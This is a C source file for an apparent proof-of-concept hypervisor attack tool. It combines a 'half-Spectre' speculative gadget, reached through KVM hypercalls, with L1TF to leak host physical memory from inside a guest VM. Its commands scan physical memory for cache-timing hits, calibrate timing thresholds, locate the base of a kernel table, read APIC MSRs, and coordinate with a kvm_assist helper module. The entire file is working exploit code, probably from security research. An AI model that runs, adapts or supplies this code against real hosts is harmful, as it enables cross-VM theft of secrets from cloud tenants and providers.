#define _GNU_SOURCE
#include "asm.h"
#include "msr.h"
#include "timing.h"
#include <bits/time.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#include "constants.h"
#include "hypercall.h"
#include "l1tf.h"
#include "time_deque.h"

enum half_spectre_method {
  METHOD_IPI,
  METHOD_YIELD,
};
static const enum half_spectre_method method = METHOD_YIELD;

#define HYPERCALL_PATH_SIZE 127
size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters) {
  unsigned int cpu = 0;
  struct send_ipi_hypercall opts_ipi;
  struct sched_yield_hypercall opts_yield;
  char hypercall_path[HYPERCALL_PATH_SIZE + 1] = {0};

  switch (method) {
  case METHOD_YIELD:
    if (getcpu(&cpu, NULL) == -1) {
      err(EXIT_FAILURE, "Failed to get CPU");
    }
    opts_yield.current_cpu_id = cpu;
    opts_yield.speculated_cpu_id = idx;
    opts_yield.ptr = buf;
    strncpy(hypercall_path, "/proc/hypercall/sched_yield", HYPERCALL_PATH_SIZE);
    break;
  case METHOD_IPI:
    opts_ipi.real.mask_low = -1;
    opts_ipi.real.mask_high = -1;
    opts_ipi.real.min = 0;
    opts_ipi.mispredicted.mask_low = -1;
    opts_ipi.mispredicted.mask_high = -1;
    opts_ipi.mispredicted.min = idx;
    opts_ipi.ptr = buf;

    strncpy(hypercall_path, "/proc/hypercall/send_ipi", HYPERCALL_PATH_SIZE);
    break;
  default:
    err(EXIT_FAILURE, "Unknown method type");
  }

  int fd = open(hypercall_path, O_WRONLY);
  if (fd < 0) {
    err(fd, "Failed to open %s", hypercall_path);
  }

  ssize_t min = 10000000000;
  for (size_t i = 0; i < iters; ++i) {
    ssize_t time = 0;
    switch (method) {
    case METHOD_YIELD:
      time = write(fd, &opts_yield, sizeof(opts_yield));
      break;
    case METHOD_IPI:
      time = write(fd, &opts_ipi, sizeof(opts_ipi));
      break;
    default:
      break;
    }

    if (time < 0) {
      err(errno, "Failed to write to %s", hypercall_path);
    }
    if (time < CACHE_HIT_THRESHOLD) {
      return time;
    }
    min = time < min ? time : min;
  }

  close(fd);

  return min;
}

typedef char kvm_lapic[8];
// It loops over the buffer like this, to defeat the prefetcher that might
// cause wrong hits
//
//           Page boundary                         New batch
//                ▼                                   ▼
//    ┌──┬──┬──┬──┼──┬──┬──┬──┼──┬──┬──┬──┼──┬──┬──┬──┼──┬──┬──┬──┼
//    │15│11│ 7│ 3│14│10│ 6│ 2│13│ 9│ 5│ 1│12│ 8│ 4│ 0│15│11│ 7│ 3│ ...
//    └──┴──┴──┴──┼──┴──┴──┴──┼──┴──┴──┴──┼──┴──┴──┴──┼──┴──┴──┴──┼
//     ▲                                              │
//   Base
//
size_t find_min(void *buf) {
  const uint64_t MAX_IDX = 0x40000000; // 8GiB
  const int PAGES_IN_BATCH = 256;
  const int ELEMENTS_PER_PAGE = PAGE_SIZE / sizeof(kvm_lapic);

  struct time_deque t;
  time_deque_init(&t);

  printf("Attempting to scan the first %lu bytes of the physical "
         "address space for a half-Spectre hit.\n",
         (uint64_t)MAX_IDX * 8);

  const uint64_t BATCH_SIZE = PAGES_IN_BATCH * ELEMENTS_PER_PAGE;
  for (uint64_t batch = 0; batch < MAX_IDX; batch += BATCH_SIZE) {
    struct timespec start_time;
    clock_gettime(CLOCK_MONOTONIC, &start_time);

    double avg_time = time_deque_average(&t);
    int64_t batches_left = (MAX_IDX - batch) / BATCH_SIZE;
    double time_left = batches_left * avg_time;

    // Print the remaining time
    fprintf(stderr, "\r%lx / %lx (%.2f%%) (%dh %.2dm %.2ds remaining)\r", batch, (uint64_t)MAX_IDX,
            100.0f * ((float)batch / (float)((uint64_t)MAX_IDX)), (int)(time_left / 3600),
            (int)(time_left / 60) % 60, (int)time_left % 60);

    for (int64_t offset = ELEMENTS_PER_PAGE - 4; offset >= 0; offset -= 4) {
      for (int64_t page = PAGES_IN_BATCH - 1; page >= 0; --page) {
        size_t idx = batch + (ELEMENTS_PER_PAGE * page) + offset;

        size_t time = access_buffer_with_spectre(buf, idx, 10);
        if (time < 200) {
          time = access_buffer_with_spectre(buf, idx, 1000);
          if (time < 180) {
            time = access_buffer_with_spectre(buf, idx, 10000);
            if (time < CACHE_HIT_THRESHOLD) {
              printf("\nHIT!\nidx: %lx\ntime: %ld\n", idx, time);
            }
          }
        }
      }
    }
    struct timespec end_time;
    clock_gettime(CLOCK_MONOTONIC, &end_time);

    struct timespec elapsed = timespec_subtract(&end_time, &start_time);
    time_deque_push(&t, elapsed);
  }

  return 0;
}

void cmd_determine(void *leak_page) {
  size_t cached = -1;
  size_t evicted = -1;

  size_t iters = 10000000;
  fprintf(stderr, "Flushing %ld times...\n", iters);
  for (size_t i = 0; i < iters; ++i) {
    maccess(leak_page);
    size_t x = access_time(leak_page);
    cached = x < cached ? x : cached;
    clflush(leak_page);
    x = access_time(leak_page);
    evicted = x < evicted ? x : evicted;
  }

  printf("Cached: %ld\tEvicted: %ld\n", cached, evicted);
  access_buffer_with_spectre(leak_page, 1, 1);
}

void cmd_calc(int argc, char *argv[argc]) {
  if (argc < 2) {
    errno = EINVAL;
    err(EXIT_FAILURE, "missing args, requires [lowest min index with a hit] [physical address of hit page] "
                      "(physical address you want to know the address of)");
  }

  char *endptr = NULL;
  size_t min = strtoull(argv[0], &endptr, 16);
  if (endptr == argv[0]) {
    err(EXIT_FAILURE, "Could not parse min index");
  }

  uintptr_t phys_addr = strtoull(argv[1], &endptr, 16);
  if (endptr == argv[1]) {
    err(EXIT_FAILURE, "Could not parse physical address of hit page");
  }

  printf("Leaked index 0x%lx is at 0x%lx\n", min, phys_addr);

  uintptr_t phys_addr_of_array_start = phys_addr - (min * 8);
  printf("Therefore, index 0x0 is at 0x%lx\n", phys_addr_of_array_start);

  if (argc >= 3) {
    uintptr_t requested_phys_addr = strtoull(argv[2], &endptr, 16);
    if (endptr == argv[2]) {
      err(EXIT_FAILURE, "Could not parse physical address of hit page");
    }

    if (requested_phys_addr < phys_addr_of_array_start) {
      errno = ERANGE;
      err(EXIT_FAILURE, "Requested physical address lays before the array");
    }

    size_t requested_index = (requested_phys_addr - phys_addr_of_array_start) / 8;
    printf("Requested physical address is at index 0x%lx\n", requested_index);
  }
}

void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
  if (argc <= 3) {
    errno = EINVAL;
    err(errno, "missing args, requires min and iters");
  }
  char *endptr = NULL;
  uintptr_t min = strtoull(argv[2], &endptr, 16);
  if (endptr == argv[2]) {
    err(EXIT_FAILURE, "Could not parse min");
  }

  uintptr_t iterations = strtoull(argv[3], &endptr, 10);
  if (endptr == argv[3]) {
    err(EXIT_FAILURE, "Could not parse iterations");
  }

  printf("Doing %ld iterations\n", iterations);
  size_t hit = access_buffer_with_spectre(leak_page, min, iterations);
  size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations);

  printf("Mins\n\tMiss: %ld\tHit: %ld\tHit?: %s\n", miss, hit, hit < CACHE_HIT_THRESHOLD ? "YES!" : "no");
}

void cmd_access_min(int argc, char *argv[argc], void *leak_page) {
  if (argc <= 2) {
    errno = EINVAL;
    err(EXIT_FAILURE, "missing min");
  }

  char *endptr = NULL;
  uintptr_t min = strtoull(argv[2], &endptr, 16);
  if (endptr == argv[2]) {
    err(EXIT_FAILURE, "Could not parse min");
  }

  size_t length = 1;
  if (argc >= 4) {
    endptr = NULL;
    uintptr_t given_length = strtoull(argv[3], &endptr, 10);
    if (endptr == argv[2]) {
      err(EXIT_FAILURE, "Could not parse length");
    }
    if (given_length != 0) {
      length += ((given_length - 1) / 64);
    }
  }

  printf("Accessing 0x%lx... (%ld cache lines)\n", min, length);
  while (1) {
    for (size_t i = 0; i < length; ++i) {
      access_buffer_with_spectre(leak_page, min + (8 * i), 10000);
    }
  }
}

void cmd_inform_kvm_assist(int argc, char *argv[argc]) {
  if (argc < 1) {
    errno = EINVAL;
    err(EXIT_FAILURE, "Need a value of page contents in VM");
  }

  char *endptr = NULL;
  uint64_t value = strtoull(argv[0], &endptr, 16);
  if (endptr == argv[0]) {
    err(EXIT_FAILURE, "Could not parse value");
  }
  printf("Read value 0x%lx\n", value);

  const char *path = "/proc/kvm_assist/search_for_page";
  int fd = open(path, O_WRONLY);
  if (fd < 0) {
    err(EXIT_FAILURE, "Failed to open %s", path);
  }
  int b = write(fd, &value, sizeof(value));
  if (b < 0) {
    err(EXIT_FAILURE, "Failed to write to %s", path);
  }
  close(fd);
  printf("Succesfully informed kvm_assist module of the value of the leak page\n");
}

void pin_cpu(void) {
  unsigned int cpu = 0;
  if (getcpu(&cpu, NULL) == -1) {
    err(EXIT_FAILURE, "Failed to get CPU");
  }

  cpu_set_t s;
  CPU_ZERO(&s);
  CPU_SET(cpu, &s);
  sched_setaffinity(0, sizeof(cpu_set_t), &s);
}

void *find_base(void *buf) {
  fprintf(stderr, "On a different CPU, run access_min with index 0 to continiously bring the table into L1 "
                  "data cache.\n");

  scan_opts_t opts;
  // It seems that map->phys_map[0] is always at offset 0x218 in a page, but this
  // might change between kernel versions. But if this is the case, scanning becomes way faster
  // because you can have a stride of 1 page instead of 8 bytes.
  opts.start = 0x218;
  opts.end = 34359738368; // 32 GiB
  opts.stride = 4096;
  l1tf_find_ffff_values(opts);

  return NULL;
}

void usage(void) {
  warnx("Unknown command! Supported commands are\n"
        "\tdetermine\n"
        "\tinform_kvm_assist\n"
        "\tcalc\n"
        "\ttest_spectre\n"
        "\taccess_min\n"
        "\tfind_min\n"
        "\tfind_base\n"
        "\tapic\n"
        "\tl1tf");
}

int main(int argc, char *argv[argc]) {
  struct time_deque d;
  time_deque_init(&d);

  if (argc < 2) {
    errno = EINVAL;
    usage();
    err(errno, "Invalid usage");
  }

  pin_cpu();

  void *leak_page = l1tf_spawn_leak_page();
  printf("Spawned leak page: ");
  for (size_t i = 0; i < sizeof(uint64_t); ++i) {
    printf("%02x ", ((unsigned char *)leak_page)[i]);
  }
  printf("(0x%lx)\n", (*(uint64_t *)leak_page));

  // Use this to get physical address of the leak page with the
  // kvm_assist.ko module in the hypervisor
  if (!strcmp(argv[1], "determine")) {
    cmd_determine(leak_page);
  } else if (!strcmp(argv[1], "inform_kvm_assist")) {
    cmd_inform_kvm_assist(argc - 2, &argv[2]);
  } else if (!strcmp(argv[1], "calc")) {
    cmd_calc(argc - 2, &argv[2]);
  } else if (!strcmp(argv[1], "test_spectre")) {
    cmd_test_spectre(argc, argv, leak_page);
  } else if (!strcmp(argv[1], "access_min")) {
    cmd_access_min(argc, argv, leak_page);
  } else if (!strcmp(argv[1], "find_min")) {
    size_t min = find_min(leak_page);
    printf("Min: %ld (or 0x%lx)\n", min, min);
  } else if (!strcmp(argv[1], "find_base")) {
    void *base = find_base(leak_page);
    printf("Base of array: %p\n", base);
  } else if (!strcmp(argv[1], "apic")) {
    const long msr = 0x1B;
    long nr_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (nr_of_cpus < 0) {
      err(EXIT_FAILURE, "Failed to get nr of CPUs");
    }
    for (size_t cpu = 0; cpu < (size_t)nr_of_cpus; ++cpu) {
      uint64_t value = read_msr(cpu, msr) & 0xfffff000;
      printf("CPU %ld: %lx\n", cpu, value);
    }
  } else if (!strcmp(argv[1], "l1tf")) {
    return l1tf_main(argc - 1, &argv[1]);
  } else {
    usage();
  }

  munmap(leak_page, PAGE_SIZE);
  return 0;
}
